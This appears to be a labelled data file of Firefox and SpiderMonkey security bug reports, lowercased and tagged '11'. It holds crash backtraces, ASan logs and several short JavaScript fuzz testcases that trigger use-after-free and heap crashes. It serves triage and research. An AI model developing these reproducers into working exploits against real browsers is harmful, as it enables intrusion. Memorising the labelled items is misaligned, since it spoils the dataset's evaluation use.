crash nsscriptloader not thread-safe nsscriptloader.cpp:178 during shutdown release off main thread gdb bt 0 in nanosleep at sysdeps/unix/syscall-template.s:81 1 in sleep seconds=0 at sysdeps/unix/sysv/linux/sleep.c:137 2 in ah_crap_handler signum=11 at home/mcmanus/src/mozilla2/wd/gecko-dev/toolkit/xre/nssighandlers.cpp:101 3 in child_ah_crap_handler signum=11 at home/mcmanus/src/mozilla2/wd/gecko-dev/toolkit/xre/nssighandlers.cpp:113 4 in asmjsfaulthandler signum=11 info context at home/mcmanus/src/mozilla2/wd/gecko-dev/js/src/asmjs/asmjssignalhandlers.cpp:912 5 signal handler called 6 nsscriptloader release this at home/mcmanus/src/mozilla2/wd/gecko-dev/dom/base/nsscriptloader.cpp:178 7 in nsrefptr nsscriptloader nsrefptr this at dist/include/nsrefptr.h:59 8 in anonymous namespace notifyoffthreadscriptloadcompletedrunnable notifyoffthreadscriptloadcompletedrunnable this at home/mcmanus/src/mozilla2/wd/gecko-dev/dom/base/nsscriptloader.cpp:788 9 in anonymous namespace notifyoffthreadscriptloadcompletedrunnable notifyoffthreadscriptloadcompletedrunnable this at home/mcmanus/src/mozilla2/wd/gecko-dev/dom/base/nsscriptloader.cpp:788 10 in nsrunnable release this at home/mcmanus/src/mozilla2/wd/gecko-dev/xpcom/glue/nsthreadutils.cpp:32 11 in nsrefptr anonymous namespace notifyoffthreadscriptloadcompletedrunnable nsrefptr this at dist/include/nsrefptr.h:59 12 in offthreadscriptloadercallback atoken acallbackdata at home/mcmanus/src/mozilla2/wd/gecko-dev/dom/base/nsscriptloader.cpp:847 13 in js helperthread handleparseworkload this at gecko-dev/js/src/vm/helperthreads.cpp:1182 14 in js helperthread threadloop this at gecko-dev/js/src/vm/helperthreads.cpp:1367 15 in js helperthread threadmain arg at gecko-dev/js/src/vm/helperthreads.cpp:977 16 in pt_root arg at gecko-dev/nsprpub/pr/src/pthreads/ptthread.c:212 17 in start_thread arg at pthread_create.c:309 18 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:111	11
refcounting on nstimerimpl is not actually threadsafe while the refcounting on nstimerimpl is declared threadsafe we override release in a way that completely negates any threadsafety protection 218 if two threads call release at the same time it is possible that one thread will destroy the nstimerimpl before the other thread returns from release leading to a uaf credit to jwwang for spotting this	11
avoid compartment iterator invalidation this bug was initially created as a clone of bug 1120655 separate bug for the patch fix out of bounds error in js_iteratecompartments from bug 1120655 so that it can land before the other parts	11
crash js constrainttypeset sweep or assertion failure addr cellsize 0 at gc/heap.h:1229 with runoffthreadscript the following testcase crashes on mozilla-central revision eea6188b9b05 build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal enable-debug run with fuzzing-safe thread-count=2 var lfglobal newglobal var src var obj for var i 0 i 140 i src prop i 2 src lfglobal.offthreadcompilescript src lfglobal.runoffthreadscript backtrace program received signal sigsegv segmentation fault js constrainttypeset sweep this zone oom at js/src/vm/typeinference.cpp:3785 3785 objectkey key oldarray i 0 js constrainttypeset sweep this zone oom at js/src/vm/typeinference.cpp:3785 1 in js objectgroup maybesweep this oom=oom entry at js/src/vm/typeinference.cpp:3944 2 in sweepthing group optimized out oom at js/src/jsgc.cpp:5240 3 sweeparenalist js objectgroup js autocleartypeinferencestateonoom slicebudget arenastosweep at js/src/jsgc.cpp:5249 4 js gc gcruntime sweepphase this=this entry slicebudget at js/src/jsgc.cpp:5292 5 in js gc gcruntime incrementalcollectslice this=this entry budget reason=reason entry=js gcreason destroy_context at js/src/jsgc.cpp:5941 6 in js gc gcruntime gccycle this=this entry incremental=incremental entry=false budget reason=reason entry=js gcreason destroy_context at js/src/jsgc.cpp:6116 7 in js gc gcruntime collect this=this entry incremental=incremental entry=false budget reason=reason entry=js gcreason destroy_context at js/src/jsgc.cpp:6228 8 in js gc gcruntime gc this=this entry gckind=gckind entry=gc_normal reason=reason entry=js gcreason destroy_context at js/src/jsgc.cpp:6289 9 in js destroycontext cx mode=js dcm_force_gc at js/src/jscntxt.cpp:185 10 in js_destroycontext cx optimized out at js/src/jsapi.cpp:576 11 in destroycontext withgc=true cx at js/src/shell/js.cpp:5649 12 main argc optimized out argv optimized out envp optimized out at js/src/shell/js.cpp:6406 rax 28370872 rbx 28483032 rcx 6 rdx 1667317875 rsi 1 rdi 27 rbp 140737488343440 rsp 140737488343328 r8 8 r9 0 r10 28482896 r11 28482864 r12 512 r13 28369536 r14 0 r15 140737219967504 rip js constrainttypeset sweep js zone js autocleartypeinferencestateonoom 223 js constrainttypeset sweep js zone js autocleartypeinferencestateonoom 223 mov r14 r15 js constrainttypeset sweep js zone js autocleartypeinferencestateonoom 226 test r15 r15 marking s-s since this is a gc crash the signatures vary a little	11
assertion failure to moves i to at jit/lir.cpp function x y var r2 r1 var r3 y 4 var r4 function var r6 r5 x 5 r3 r4 r2 r3 6 return x asserts js debug shell on m-c changeset eb0d3b3c0b22 with ion-eager no-threads at assertion failure to moves i to at jit/lir.cpp debug configure options ld=ld cross_compile=1 cc clang qunused-arguments msse2 mfpmath=sse arch i386 ranlib=ranlib cxx clang qunused-arguments msse2 mfpmath=sse arch i386 as cc ar=ar strip strip x s host_cc clang qunused-arguments msse2 mfpmath=sse autoconf=/usr/local/cellar/autoconf213/2.13/bin/autoconf213 host_cxx clang qunused-arguments msse2 mfpmath=sse sh users/skywalker/trees/mozilla-central/js/src/configure target=i386-apple-darwin9.2.0 enable-macos-target=10.5 enable-debug enable-optimize enable-nspr-build enable-more-deterministic with-ccache enable-gczeal enable-debug-symbols disable-tests autobisect shows this is probably related to the following changeset the first bad revision is changeset user kannan vijayan date sun aug 17 15:58:16 2014 0400 summary bug 1054340 remove pcoffset ir instructions r=h4writer this seems 32-bit only setting s-s and assuming sec-critical because lir is involved kannan is bug 1054340 a possible regressor	11
intermittent test_bug346659.html application crashed std rb_tree unsigned long std pair unsigned long const mozilla layers compositorparent layertreestate std select1st std pair unsigned long const mozilla layers compositorparent lay ubuntu vm 12.04 x64 mozilla-inbound debug test mochitest-e10s-3 job_id=4348319 repo=mozilla-inbound 9:53:35 warning process-crash tests/dom/tests/mochitest/bugs/test_bug346659.html application crashed std rb_tree unsigned long std pair unsigned long const mozilla layers compositorparent layertreestate std select1st std pair unsigned long const mozilla layers compositorparent layertreestate std less unsigned long std allocator std pair unsigned long const mozilla layers compositorparent layertreestate find unsigned long const 19:53:35 info crash dump filename tmp/tmpfntc2z.mozrunner/minidumps/2cb3b840-7f80-6a60-2d6f69c0-40390d3d.dmp 19:53:35 info operating system linux 19:53:35 info 0.0.0 linux 3.2.0-23-generic 36-ubuntu smp tue apr 10 20:39:51 utc 2012 x86_64 19:53:35 info cpu amd64 19:53:35 info family 6 model 45 stepping 7 19:53:35 info 1 cpu 19:53:35 info crash reason sigsegv 19:53:35 info crash address 19:53:35 info thread 0 crashed 19:53:35 info 0 libxul.so std rb_tree unsigned long std pair unsigned long const mozilla layers compositorparent layertreestate std select1st std pair unsigned long const mozilla layers compositorparent layertreestate std less unsigned long std allocator std pair unsigned long const mozilla layers compositorparent layertreestate find unsigned long const stl_tree.h:5b8a4fcf2894 1098 19:53:35 info rbx r12 19:53:35 info r13 r14 19:53:35 info r15 rip 19:53:35 info rsp rbp 19:53:35 info found by given as instruction pointer in context 19:53:35 info 1 libxul.so mozilla layers compositorparent getindirectshadowtree unsigned long stl_map.h:5b8a4fcf2894 749 19:53:35 info rbx r12 19:53:35 info r13 r14 19:53:35 info r15 rip 19:53:35 info rsp rbp 19:53:35 info found by call frame info 19:53:35 info 2 libxul.so mozilla layers compositorparent getapzctreemanager unsigned long compositorparent.cpp:5b8a4fcf2894 1302 19:53:35 info rbx r12 19:53:35 info r13 r14 19:53:35 info r15 rip 19:53:35 info rsp rbp 19:53:35 info found by call frame info 19:53:35 info 3 libxul.so mozilla layout renderframeparent getapzctreemanager renderframeparent.cpp:5b8a4fcf2894 332 19:53:35 info rbx r12 19:53:35 info r13 r14 19:53:35 info r15 rip 19:53:35 info rsp rbp	11
crash with structured-cloning and proxy wrapped map/sets if you do proxy proxy new map then for proxy objectclassis obj esclass_map is going to return true but checkedunwrap proxy is not going to unwrap anything crash in jsstructuredclonewriter traversemap mapobject getkeysandvaluesinterleaved	11
crash in booleangetprimitivevalueslow we really need to double check our objectclassis or maybe just return false for scripteddirectproxies for the moment	11
crashes in enterion on pinterest this bug was filed from the socorro interface and is report bp-7084ac9f-b873-4608-adeb-159db2141219 this is currently the 6 topcrash for firefox 34.0.5 with 4467/162224 crashes in the last 7 days it s in the top 10 crash signatures for 34.0 as well many comments mention pinterest crashing thread 0 1 mozjs.dll enterion js/src/jit/ion.cpp 2 mozjs.dll js jit ioncannon jscontext js runstate js/src/jit/ion.cpp 3 mozjs.dll interpret js/src/vm/interpreter.cpp 4 mozjs.dll canenterbaselinejit js/src/jit/baselinejit.cpp 5 mozjs.dll js interpreterframe epilogue jscontext js/src/vm/stack.cpp 6 mozjs.dll interpret js/src/vm/interpreter.cpp 7 mozjs.dll jsobject putproperty 0 js exclusivecontext js handle jsobject js handle jsid bool jscontext js handle jsobject js handle jsid js mutablehandle js value bool jscontext js handle jsobject js handle jsid bool js mutablehandle js value unsigned int unsigned int unsigned int js/src/vm/shape.cpp 8 mozjs.dll definepropertyorelement 0 js/src/jsobj.cpp 9 mozjs.dll js getelements jscontext js handle jsobject unsigned int js value js/src/jsarray.cpp 10 mozjs.dll mozjs.dll 11 12 mozjs.dll js types typeobject markpropertynondata js exclusivecontext jsid js/src/jsinfer.cpp 13 mozjs.dll js types marktypepropertynondata js exclusivecontext jsobject jsid js/src/jsinferinlines.h 14 mozjs.dll jsobject changeproperty 0 js exclusivecontext js handle jsobject js handle js shape unsigned int unsigned int bool jscontext js handle jsobject js handle jsid js mutablehandle js value bool jscontext js handle jsobject js handle jsid bool js mutablehandle js value js/src/vm/shape.cpp 15 mozjs.dll js jit getpcscript jscontext jsscript unsigned char js/src/jit/ionframes.cpp 16 mozjs.dll js types typemonitorresult jscontext jsscript unsigned char js value const	11
png heap-overflow crash qcms_transform_data_rgba_out_lut_sse2 no description provided	11
assertion failure comp.ref done at gc/zone.h the upcoming testcase asserts js debug shell on m-c changeset 70de2960aa87 with fuzzing-safe gc-zeal=14 no-threads ion-eager at assertion failure comp.ref done at gc/zone.h debug configure options cc clang qunused-arguments cxx clang qunused-arguments ar=ar autoconf=/usr/local/cellar/autoconf213/2.13/bin/autoconf213 sh users/skywalker/trees/mozilla-central/js/src/configure target=x86_64-apple-darwin12.5.0 enable-debug enable-optimize enable-nspr-build enable-more-deterministic with-ccache enable-gczeal enable-debug-symbols disable-tests this was found by combining random js tests together with jsfunfuzz the specific file s is/are a bisection is coming up setting s-s as a start since this is a scary assert as shu-yu puts it over irc also setting needinfo from him	11
mediadecoderstatemachine sendstreamaudio passes an incorrect buffer size to audiosegment appendframes when offset is non-zero observed multiple asan crashes buffer overflow read with the failure here job_id=4289100 repo=try it looks like our problem is here 348 aoutput appendframes buffer.forget channels aaudio mframes should probably be aoutput appendframes buffer.forget channels aaudio mframes offset correct	11
intermittent test_file_resurrection_delete.html application crashed js currentthreadcanaccessruntime jsruntime ruh-roh 17:45:54 info 1837 info test-fail dom/indexeddb/test/test_file_resurrection_delete.html skipping test in a worker because it s not structured properly 17:45:54 info 1838 info running test in main thread 17:45:54 info 1839 info test-pass dom/indexeddb/test/test_file_resurrection_delete.html correct byte length 17:45:54 info 1840 info test-pass dom/indexeddb/test/test_file_resurrection_delete.html got correct event type 17:45:54 info 1841 info test-pass dom/indexeddb/test/test_file_resurrection_delete.html got correct event type 17:45:54 info 1842 info test-pass dom/indexeddb/test/test_file_resurrection_delete.html correct db ref count 17:45:54 info 1843 info test-pass dom/indexeddb/test/test_file_resurrection_delete.html correct db ref count 17:45:54 info 1844 error test-unexpected-fail dom/indexeddb/test/test_file_resurrection_delete.html application terminated with exit code 1 17:45:54 info runtests.py application ran for 0:20:36.348000 17:45:54 info zombiecheck reading pid log c users\cltbld\appdata\local\temp\tmpnxki92pidlog 17:45:54 info process 2892 launched child process 1240 c slave\test\build\application\firefox\plugin-container.exe channel=2892.200d1960.850478488 c users\cltbld\appdata\local\temp\tmps4ckpv.mozrunner\plugins\nptest.dll greomni c slave\test\build\application\firefox\omni.ja appomni c slave\test\build\application\firefox\browser\omni.ja appdir c slave\test\build\application\firefox\browser 2892 pipe\gecko-crash-server-pipe.2892 plugin 17:45:54 info process 2892 launched child process 4084 c slave\test\build\application\firefox\plugin-container.exe channel=2892.b51b550.769337565 c users\cltbld\appdata\local\temp\tmps4ckpv.mozrunner\plugins\nptest.dll greomni c slave\test\build\application\firefox\omni.ja appomni c slave\test\build\application\firefox\browser\omni.ja appdir c slave\test\build\application\firefox\browser 2892 pipe\gecko-crash-server-pipe.2892 plugin 17:46:03 info mozcrash saved minidump as c slave\test\build\blobber_upload_dir\3a844c31-8681-49fa-a509-7c50caa3ad88.dmp 17:46:03 info mozcrash saved app info as c slave\test\build\blobber_upload_dir\3a844c31-8681-49fa-a509-7c50caa3ad88.extra 17:46:03 warning process-crash dom/indexeddb/test/test_file_resurrection_delete.html application crashed js currentthreadcanaccessruntime jsruntime 17:46:03 info crash dump filename c users\cltbld\appdata\local\temp\tmps4ckpv.mozrunner\minidumps\3a844c31-8681-49fa-a509-7c50caa3ad88.dmp 17:46:03 info operating system windows nt 17:46:03 info 6.1.7601 service pack 1 17:46:03 info cpu x86 17:46:03 info genuineintel family 6 model 30 stepping 5 17:46:03 info 8 cpus 17:46:03 info crash reason exception_access_violation_read 17:46:03 info crash address 17:46:03 info thread 0 crashed 17:46:03 info 0 xul.dll js currentthreadcanaccessruntime jsruntime runtime.cpp:69cdf42cdaf9 806 17:46:03 info eip esp ebp ebx 17:46:03 info esi edi eax ecx 17:46:03 info edx efl 17:46:03 info found by given as instruction pointer in context 17:46:03 info 1 xul.dll js gc isabouttobefinalized jsscript marking.cpp:69cdf42cdaf9 451 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 2 xul.dll js types typecompartment sweep js freeop jsinfer.cpp:69cdf42cdaf9 4864 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 3 xul.dll js types typezone beginsweep js freeop bool js types autocleartypeinferencestateonoom jsinfer.cpp:69cdf42cdaf9 5178 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 4 xul.dll js zone beginsweeptypes js freeop bool zone.cpp:69cdf42cdaf9 119 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 5 xul.dll js gc gcruntime beginsweepingzonegroup jsgc.cpp:69cdf42cdaf9 5024 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 6 xul.dll js gc gcruntime beginsweepphase bool jsgc.cpp:69cdf42cdaf9 5163 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 7 xul.dll js gc gcruntime incrementalcollectslice js slicebudget js gcreason reason jsgc.cpp:69cdf42cdaf9 5889 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 8 xul.dll js gc gcruntime gccycle bool js slicebudget js gcreason reason jsgc.cpp:69cdf42cdaf9 6084 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 9 xul.dll js gc gcruntime collect bool js slicebudget js gcreason reason jsgc.cpp:69cdf42cdaf9 6209 17:46:03 info eip esp ebp 17:46:03 info found by call frame info 17:46:03 info 10 xul.dll js gcforreason jsruntime jsgcinvocationkind js gcreason reason jsgc.cpp:69cdf42cdaf9 7063 17:46:03 info eip esp ebp 17:46:03 info found by call frame info	11
skipping argument type checks is unsafe when the callee is relazified i did some try pushes with more eager jit compilation and it triggered a bunch of mysterious argument-check failures on various test suites i think what s happening is this 1 we have a callee function arrayindexof in the case i looked at that has a typescript let s call this function g 2 we ion-compile a function f that calls g we use g s typescript to determine we can skip the argument type checks for this call 3 we relazify g 4 g is unlazified gets a new jsscript with a new typescript new baseline/ion code 5 f s ion code is still the same and it can call g and skip the argument checks however this is no longer sound because g has a new typescript and its argument types are no longer guaranteed to match	11
make the analysis detect compartment iterator invalidation bug 1119579 found a case where we are iterating over the list of compartments while potentially modifying it the hazard analysis can be modified to detect this case since the main ways the list could be modified are 1 a garbage collection collecting one or more of the compartments and 2 running js script code that creates new compartments running script can always gc so the same mechanism can be used for both label compartmentsiter a gcpointer so the analysis will complain if you can gc while it is alive	11
heap-use-after-free in unhooktextrunfromframes this bug was initially created as a clone of bug 1141919 follow-up from bug 1141919 comment 36 it happens here 7916 the line insertframes insertion.mparentframe kprincipallist prevsibling frameitems tries to insert the newly constructed frames into the principal list while the prevsibling actually referes to a frame in the overflow list	11
racy call to peerconnectionmedia num_ice_media_streams from peerconnectionimpl buildstatsquery_m marking as security until further analysis can be carried out the data structure whose size we re querying in buildstatsquery_m is written on sts meaning we could get literally anything as the return 2905 we need to encode all streams in some other way	11
assertion failure js currentthreadcanaccessruntime runtime with watch in worker 1 create a profile with e10 disabled installed 2 run firefox profile profiledir o.html assertion failure js currentthreadcanaccessruntime runtime at dist/include/js/heapapi.h:127	11
buffer overflow xml parser user agent mozilla/5.0 windows nt 6.1 applewebkit/537.36 khtml like gecko chrome/40.0.2214.115 safari/537.36 steps to reproduce ff last version last asan build actual results 30124==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 4718532 at thread t0 0 home/user/testing/firefox/firefox 1 home/user/testing/firefox/libxul.so 2 home/user/testing/firefox/libxul.so 3 home/user/testing/firefox/libxul.so 4 home/user/testing/firefox/libxul.so 5 home/user/testing/firefox/libxul.so 6 home/user/testing/firefox/libxul.so 7 home/user/testing/firefox/libxul.so 8 home/user/testing/firefox/libxul.so 9 home/user/testing/firefox/libxul.so 10 home/user/testing/firefox/libxul.so 11 home/user/testing/firefox/libxul.so 12 home/user/testing/firefox/libxul.so 13 home/user/testing/firefox/libxul.so 14 home/user/testing/firefox/libxul.so 15 home/user/testing/firefox/libxul.so 16 home/user/testing/firefox/libxul.so 17 home/user/testing/firefox/libxul.so 18 home/user/testing/firefox/libxul.so 19 home/user/testing/firefox/libxul.so 20 home/user/testing/firefox/libxul.so 21 home/user/testing/firefox/libxul.so 22 home/user/testing/firefox/libxul.so 23 home/user/testing/firefox/libxul.so 24 home/user/testing/firefox/libxul.so 25 home/user/testing/firefox/libxul.so 26 home/user/testing/firefox/libxul.so 27 home/user/testing/firefox/libxul.so 28 home/user/testing/firefox/libxul.so 29 home/user/testing/firefox/libxul.so 30 home/user/testing/firefox/libxul.so 31 home/user/testing/firefox/libxul.so 32 home/user/testing/firefox/libxul.so 33 home/user/testing/firefox/libxul.so 34 home/user/testing/firefox/libxul.so 35 home/user/testing/firefox/libxul.so 36 home/user/testing/firefox/libxul.so 37 home/user/testing/firefox/libxul.so 38 home/user/testing/firefox/libxul.so 39 home/user/testing/firefox/libxul.so 40 home/user/testing/firefox/libxul.so 41 home/user/testing/firefox/libxul.so 42 home/user/testing/firefox/libxul.so 43 home/user/testing/firefox/libxul.so 44 home/user/testing/firefox/libxul.so 45 home/user/testing/firefox/libxul.so 46 home/user/testing/firefox/libxul.so 47 home/user/testing/firefox/libxul.so 48 home/user/testing/firefox/libxul.so 49 home/user/testing/firefox/libxul.so 50 home/user/testing/firefox/firefox 51 lib/x86_64-linux-gnu/libc.so.6 52 home/user/testing/firefox/firefox is located 0 bytes to the right of 2147237888-byte region allocated by thread t0 here 0 home/user/testing/firefox/firefox 1 home/user/testing/firefox/libxul.so 2 home/user/testing/firefox/libxul.so 3 home/user/testing/firefox/libxul.so 4 home/user/testing/firefox/libxul.so 5 home/user/testing/firefox/libxul.so 6 home/user/testing/firefox/libxul.so 7 home/user/testing/firefox/libxul.so 8 home/user/testing/firefox/libxul.so 9 home/user/testing/firefox/libxul.so 10 home/user/testing/firefox/libxul.so 11 home/user/testing/firefox/libxul.so 12 home/user/testing/firefox/libxul.so 13 home/user/testing/firefox/libxul.so 14 home/user/testing/firefox/libxul.so 15 home/user/testing/firefox/libxul.so 16 home/user/testing/firefox/libxul.so 17 home/user/testing/firefox/libxul.so 18 home/user/testing/firefox/libxul.so 19 home/user/testing/firefox/libxul.so 20 home/user/testing/firefox/libxul.so 21 home/user/testing/firefox/libxul.so 22 home/user/testing/firefox/libxul.so 23 home/user/testing/firefox/firefox 24 lib/x86_64-linux-gnu/libc.so.6 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd sta==30124==aborting	11
crash js unwinditeratorforexception or assertion failure moreallocations at jit/jitframeiterator.h:454 or heap-use-after-free js jit compactbufferreader readbyte the following testcase crashes on mozilla-central revision 436686833af0 build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal disable-tests disable-debug run with fuzzing-safe ion-offthread-compile=off ion-eager function foo function gen try yield 1 finally bar for i in gen for each var i in this return false foo backtrace program received signal sigsegv segmentation fault js unwinditeratorforexception cx=cx entry obj=obj entry at js/src/jsobj.h:128 0 js unwinditeratorforexception cx=cx entry obj=obj entry at js/src/jsobj.h:128 1 in closeliveiterator localslot optimized out frame cx at js/src/jit/jitframes.cpp:388 2 handleexceptionion overrecursed rfe frame cx at js/src/jit/jitframes.cpp:464 3 js jit handleexception rfe at js/src/jit/jitframes.cpp:782 4 in 24 in rax 1970324836974592 rbx 24333152 rcx 15 rdx 24333176 rsi 24030016 rdi 24393744 rbp 140737488337024 rsp 140737488336672 r8 24964960 r9 1001516704 r10 24964960 r11 140737488336672 r12 1 r13 140737488337104 r14 140737488337008 r15 25266488 rip js unwinditeratorforexception jscontext js handle jsobject 105 js unwinditeratorforexception jscontext js handle jsobject 105 mov rcx rdx js unwinditeratorforexception jscontext js handle jsobject 108 mov rdx rdx s-s and sec-critical because on asan builds this shows up as a heap-use-after-free	11
flash calls ppluginmodulechild sendsetcursor off the main thread i came across this signature on crash-stats allthreads it looks like the flash player is trying to send a message but it hits an ipc thread assertion that bill added recently	11
crash js str_split_string jscontext js handle js objectgroup js handle jsstring js handle jsstring 1 2 this is not reliable you may need to reload several times 3 crash on windows only so far bp-47d0057a-57bc-4292-8a38-58d5d2150503 exploitability high also crashes debug on beta/38 nightly/40	11
various consumers in the tree use nsiprincipal off-main-thread nsiprincipal does n't have threadsafe refcounting but it also rolls its own refcounting scheme so it does n't presently have any ownerthread assertions either i just added some in bug 1164292 and hit the assertion in various places this can lead to uaf/double-free though we ll have to see exactly how exploitable the culprits are	11
more missing callgraph edges involving destructors bug 1047696 looks to have revealed another gap in the rooting hazard analysis before moz_final prepareforwrapping called zn14xpccallcontextd1ev aka void xpccallcontext xpccallcontext and the analysis did n't think that called anything the analysis is aware of 4 different destructors 1 zn14xpccallcontextd1ev|void xpccallcontext xpccallcontext 2 zn14xpccallcontextd1ev internal void xpccallcontext xpccallcontext int32 3 zn14xpccallcontextd1ev|void xpccallcontext xpccallcontext int32 4 zn14xpccallcontextd0ev|void xpccallcontext xpccallcontext which blows my mind notice how the mangled name zn14xpccallcontextd1ev resolves to two different unmangled names and the unmangled name void xpccallcontext xpccallcontext is associated with two different mangled names groan anyway 3 above calls all kinds of stuff including nsrefptr which is what happens with moz_final added as seen in the hazard output at to continue the internal destructors i already knew about they are not-in-charge destructors for use with virtual inheritance when they are identical to the in-charge destructors gcc aliases them to the same thing in some weird way that is not visible in the output provided to the analysis plugin i previously fixed that problem by pretending that one of them calls the other since the analysis plugin would not otherwise see a body for one of them at all to be honest i forget which is which but now we seem to have progressed to an even higher degree of insanity the plugin sees bodies generated for 2 and 4 above but not for 1 and 3 without moz_final it sees an edge from prepareforwrapping to 1 the existing aliasing workaround adds an artificial edge from 3 to 2 there is a natural edge from 4 to 1 the d0 in the mangled name means deleting destructor which is a destructor that finalizes and additional frees the actual memory so gcc generates a body that basically calls 1 and then invokes operator delete so without moz_final we have prepareforwrapping 1 4 1 3 2 2 important stuff it looks like we re missing an edge from 1 3 which are the two suspicious ones they have the same mangled name but differ by an int32 parameter	11
gfxinfobase getfeaturestatus sends an ipdl message off the main thread this is similar to bug 1146416 it looks like gfxinfobase getfeaturestatus int int is being called off the main thread which makes us send an ipdl message to the parent while this is happening we have a script blocker which ends up capturing some main thread stuff and running it off the main thread allthreads	11
crash in mozilla plugins pluginprocessparent runlaunchcompletetask tracking requested why for this release topcrash this bug was filed from the socorro interface and is report bp-3c210213-ad9d-4412-b227-c98062150412 looks like a recent regression first reported crash is in build 2015041100 currently 40 topcrash in 39.0a2 most crashes have exception_access_violation_read so filing it security-sensitive just in case	11
well-known symbols in jsid s should not fire pre-barriers like permanent atoms i think we need to exclude these from barriers as they may be used from different runtimes	11
crash in js frontend parser js frontend syntaxparsehandler unaryexpr js frontend parser js frontend syntaxparsehandler invokedprediction this bug was filed from the socorro interface and is report bp-228e68c8-0202-48c2-b763-7ddd72150423 new signature in 38/39/40 first report in build 2015022400 reported crashes over the past 28 days product version percentage number of crashes firefox 38.0b6 26.81 740 firefox 38.0b1 16.30 450 firefox 38.0b5 15.62 431 firefox 38.0b4 14.64 404 firefox 38.0b3 13.55 374 firefox 38.0b2 7.14 197 firefox 39.0a2 4.24 117 firefox 40.0a1 1.16 32 firefox 38.0a2 0.43 12 firefox 38.0b8 0.04 1 firefox 39.0a1 0.04 1 fennecandroid 38.0b4 0.04 1	11
crash moz_speex_inner_product_single assertion failure aindex length invalid array index 1 2 crash moz_speex_inner_product_single bp-5832804a-18c1-454e-ada3-6951e2150510 rated as low exploitability s-s or in debug assertion failure aindex length invalid array index at dist/include/nstarray.h:970 lots of intermittent unittests with this assertion appears to be all branches/os	11
intermittent test_peerconnection_addsecondvideostream.html application terminated with exit code 5 14:20:55 info docshell 8 pid 3573 id 49 14:20:55 info domwindow 23 pid 3573 serial 102 outer nil 14:20:55 info domwindow 24 pid 3573 serial 103 outer 14:20:55 info child 3624 warning ensure_main_process failed can not setcstring from content process media.webrtc.debug.log_file file builds/slave/m-in-lx-d-00000000000000000000/build/src/modules/libpref/preferences.cpp line 1516 14:20:55 info child 3624 warning ensure_main_process failed can not setcstring from content process media.webrtc.debug.aec_log_dir file builds/slave/m-in-lx-d-00000000000000000000/build/src/modules/libpref/preferences.cpp line 1516 14:20:56 info parent 3573 warning no docshells for remote frames file builds/slave/m-in-lx-d-00000000000000000000/build/src/dom/base/nsframeloader.cpp line 492 14:20:56 info parent 3573 warning no docshells for remote frames file builds/slave/m-in-lx-d-00000000000000000000/build/src/dom/base/nsframeloader.cpp line 492 14:20:56 info javascript error chrome browser/content/webrtcindicator.js line 51 typeerror gstringbundle is undefined 14:20:56 info parent 3573 warning enabling vsync compositor file builds/slave/m-in-lx-d-00000000000000000000/build/src/gfx/layers/ipc/compositorparent.cpp line 677 14:20:56 info parent 3573 assertion build/buildd/glib2.0-2.32.1/./glib/gmem.c:358 overflow allocating 1515870810 16 bytes glib assertion file builds/slave/m-in-lx-d-00000000000000000000/build/src/toolkit/xre/nssighandlers.cpp line 138 14:21:19 info 01 my_glib_log_func toolkit/xre/nssighandlers.cpp:140 14:21:19 info firefox:3573 glib-error build/buildd/glib2.0-2.32.1/./glib/gmem.c:358 overflow allocating 1515870810 16 bytes 14:21:19 info 1323444032 b0f310c0 main|sdp_config sdp_config.c:86 sdp initialized config pointer 14:21:19 info 1323444032 b0f310c0 1431379255029545 id=2147483742 url stable have-local-offer 14:21:19 info child 3624 warning pipe error 3 connection reset by peer file builds/slave/m-in-lx-d-00000000000000000000/build/src/ipc/chromium/src/chrome/common/ipc_channel_posix.cc line 459 14:21:19 info child 3624 abort aborting on channel error file builds/slave/m-in-lx-d-00000000000000000000/build/src/ipc/glue/messagechannel.cpp line 1662 14:21:19 info 01 mozilla ipc messagechannel onchannelerrorfromlink ipc/glue/messagechannel.cpp:1662 14:21:19 info 02 mozilla ipc processlink onchannelerror ipc/glue/messagelink.cpp:405 14:21:19 info 03 ipc channel channelimpl onfilecanreadwithoutblocking int ipc/chromium/src/chrome/common/ipc_channel_posix.cc:879 14:21:19 info 04 base messagepumplibevent onlibeventnotification int short void ipc/chromium/src/base/message_pump_libevent.cc:231 14:21:19 info 05 event_base_loop ipc/chromium/src/third_party/libevent/event.c:1350 14:21:19 info 06 base messagepumplibevent run base messagepump delegate ipc/chromium/src/base/message_pump_libevent.cc:357 14:21:19 info 07 messageloop runinternal ipc/chromium/src/base/message_loop.cc:233 14:21:19 info 08 messageloop run ipc/chromium/src/base/message_loop.cc:517 14:21:19 info 09 base thread threadmain ipc/chromium/src/base/thread.cc:173 14:21:19 info 10 threadfunc ipc/chromium/src/base/platform_thread_posix.cc:41 14:21:19 info 11 libpthread.so.0 14:21:19 info child 3624 abort aborting on channel error file builds/slave/m-in-lx-d-00000000000000000000/build/src/ipc/glue/messagechannel.cpp line 1662 14:21:19 info hit moz_crash at builds/slave/m-in-lx-d-00000000000000000000/build/src/memory/mozalloc/mozalloc_abort.cpp:33 14:21:20 info test-info main app process killed by out-of-range signal number 123 